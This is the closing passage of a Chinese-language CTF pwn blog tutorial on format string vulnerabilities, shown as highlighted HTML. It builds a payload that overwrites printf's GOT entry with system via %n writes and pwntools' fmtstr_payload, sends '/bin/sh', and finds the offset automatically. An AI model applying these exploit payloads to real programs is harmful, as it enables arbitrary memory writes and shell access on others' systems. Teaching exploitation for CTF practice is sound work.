+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">payload</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p32</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">printf_got</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">%</span><span style="color:#A65E2B;--shiki-dark:#C99076">{}</span><span style="color:#B56959;--shiki-dark:#C98A7D">c</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">format</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">system_plt</span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#2F798A;--shiki-dark:#4C9A91">4</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">encode</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#AB5959;--shiki-dark:#CB7676">b</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">%7$n</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">这里是要改写printf_got，其实际是在esp</span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">4的第七个参数</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">，利用</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#AB5959;--shiki-dark:#CB7676">&lt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">num</span><span style="color:#AB5959;--shiki-dark:#CB7676">&gt;</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">c留出system_plt</span><span style="color:#AB5959;--shiki-dark:#CB7676">-</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">4的地址个数的字符输出</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">，后面的</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#2F798A;--shiki-dark:#4C9A91">7</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">$</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">n即为将esp</span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">4的第七个参数的值作为地址</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">，写入对应地址的空间中</span></span></code></pre>
+<p>利用<code>fmtstr_payload(offset,{源地址:目的地址})</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-python"><span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">fmtstr_payload</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">offset</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> writes</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> numbwritten</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#2F798A;--shiki-dark:#4C9A91">0</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B07D48;--shiki-dark:#BD976A"> write_size</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">‘byte’</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">第一个参数表示格式化字符串的偏移；</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">第二个参数表示需要利用</span><span style="color:#AB5959;--shiki-dark:#CB7676">%</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成</span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">printfGOT</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">systemAddress</span><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">；本题是将0804a048处改为0x2223322</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（</span><span style="color:#998418;--shiki-dark:#B8A965">int</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">），对应着hhn、hn和n，默认值是byte，即按hhn写。</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">fmtstr_payload函数返回的就是payload</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">#常用形式:fmtstr_payload(offset,{address1:value1})</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">payload</span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">fmtstr_payload</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2F798A;--shiki-dark:#4C9A91">6</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">printf_got</span><span style="color:#999999;--shiki-dark:#666666">:</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">system</span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">sendline</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">payload</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">p</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">sendline</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">/bin/sh</span><span style="color:#A65E2B;--shiki-dark:#C99076">\0</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">#自动获取偏移【可以自己调试数一下】：</span></span>
+<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">def</span><span style="color:#59873A;--shiki-dark:#80A665"> get_vuln_offset</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">payload</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">:</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    p</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">sendline</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">payload</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    info </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> p</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">recv</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span>
+<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">    return</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> info</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">vuln_offset </span><span style="color:#999999;--shiki-dark:#666666">=</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> FmtStr</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">get_vuln_offset</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">offset</span></span>
+<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">log</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">info</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">vuln_offset =&gt; </span><span style="color:#A65E2B;--shiki-dark:#C99076">%s</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> %</span><span style="color:#998418;--shiki-dark:#B8A965"> hex</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">vuln_offset</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span></span></code></pre>
+<h3 id="64位程序的格式化字符串漏洞"><a class="anchor" href="#64位程序的格式化字符串漏洞">#</a> 64位程序的格式化字符串漏洞</h3>
+<p>64位参数是先用寄存器传参的，参数顺序是从<code>左</code>往<code>右</code>，依次是rdi，rsi，rdx，rcx，r8、r9，当为第七个及以上的参数时就会利用栈传参<code>【栈传参是从右向左】</code></p>
+<div class="tags"><a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i>pwn</a><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"><i class="ic i-tag"></i>格式化字符串</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-01-13 17:14:55" itemprop="dateModified" datetime="2026-01-13T17:14:55+08:00">2026-01-13</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" src="/assets/wechatpay.avif" alt="vvwwv 微信支付"><p>微信支付</p></div><div><img loading="lazy" src="/assets/alipay.avif" alt="vvwwv 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>vvwwv<i class="ic i-at"><em>@</em></i>此时相望不相闻，愿逐月华流照君</li><li class="link"><strong>本文链接：</strong><a href="https://cyb141520.github.io/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/" title="格式化字符串">https://cyb141520.github.io/2025/08/06/pwn专栏/格式化字符串漏洞_new/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap(2)/" rel="prev" itemprop="url" data-background-image="https://sat.huijiwiki.com/wiki/%E6%96%87%E4%BB%B6:Shooting_star.jpg" title="how2heap"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>PWN专栏</span><h3>how2heap</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text"> 格式化字符串函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 格式化字符串函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.2.</span> <span class="toc-text"> 格式化字符串</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> 格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.0.1.</span> <span class="toc-text"> 32位程序的格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">2.0.1.1.</span> <span class="toc-text"> 任意地址读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.0.1.2.</span> <span class="toc-text"> 任意地址写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.0.2.</span> <span class="toc-text"> 64位程序的格式化字符串漏洞</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/" rel="bookmark" title="格式化字符串">格式化字符串</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="vvwwv" src="/assets/avatar.avif"><p class="name" itemprop="name">vvwwv</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">9</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">14</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/yourname" class="item github" title="https://github.com/yourname"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap(2)/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/%E4%B8%93%E6%A0%8F/" title="分类于专栏">专栏</a></div><span><a href="/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/">格式化字符串</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/ROP/" title="分类于ROP">ROP</a></div><span><a href="/2023/08/24/pwn%E4%B8%93%E6%A0%8F/ret2csu/">64位构造通用ROP，ret2csu</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2022/10/07/hello-world/">Hello World</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/how2heap2-23/" title="分类于how2heap2.23">how2heap2.23</a><i class="ic i-angle-right"></i><a href="/categories/how2heap2-23/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a></div><span><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap/">how2heap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/how2heap2-23/" title="分类于how2heap2.23">how2heap2.23</a><i class="ic i-angle-right"></i><a href="/categories/how2heap2-23/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a></div><span><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap(2)/">how2heap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/%E6%B2%99%E7%9B%92/" title="分类于沙盒">沙盒</a></div><span><a href="/2023/08/29/pwn%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/">沙盒机制</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a></div><span><a href="/2023/09/28/pwn%E4%B8%93%E6%A0%8F/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="分类于栈溢出">栈溢出</a></div><span><a href="/2023/10/01/pwn%E4%B8%93%E6%A0%8F/ret2dlresolve/">高级ROP之ret2dlresolve</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/Linux/PWN%E4%B8%93%E6%A0%8F/CTF/DynELF/" title="分类于DynELF">DynELF</a></div><span><a href="/2023/08/29/pwn%E4%B8%93%E6%A0%8F/DynELF/">DynELF</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">© 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">vvwwv @ vvwwv</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">89k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">1:21</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config="" type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2025/08/06/pwn专栏/格式化字符串漏洞_new/`,
+    favicon: {
+        show: `（●´3｀●）やれやれだぜ`,
+        hide: `(´Д｀)大変だ！`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer=""></script></body></html>
